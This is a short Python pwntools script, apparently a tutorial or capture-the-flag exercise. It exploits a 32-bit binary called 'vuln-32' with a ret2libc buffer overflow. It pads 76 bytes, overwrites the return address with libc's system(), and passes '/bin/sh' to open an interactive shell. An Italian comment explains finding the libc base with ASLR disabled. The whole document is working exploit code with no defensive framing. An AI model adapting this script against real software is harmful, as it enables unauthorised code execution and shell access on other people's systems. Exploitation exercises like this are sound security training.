# 32-bit
from pwn import *

elf = context.binary = ELF("./vuln-32")
p = process()

libc = elf.libc  # Simply grab the libc it's running with
libc.address = 0xF7D79000  # Set base address
# l'indirizzo della LIBC, con ASLR disattivato si può trovare tranquillamente con ldd vuln-32

system = libc.sym["system"]  # Grab location of system
binsh = next(libc.search(b"/bin/sh"))  # grab string location

payload = b"A" * 76  # The padding
payload += p32(system)  # Location of system
payload += p32(0x0)  # return pointer - not important once we get the shell
payload += p32(binsh)  # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
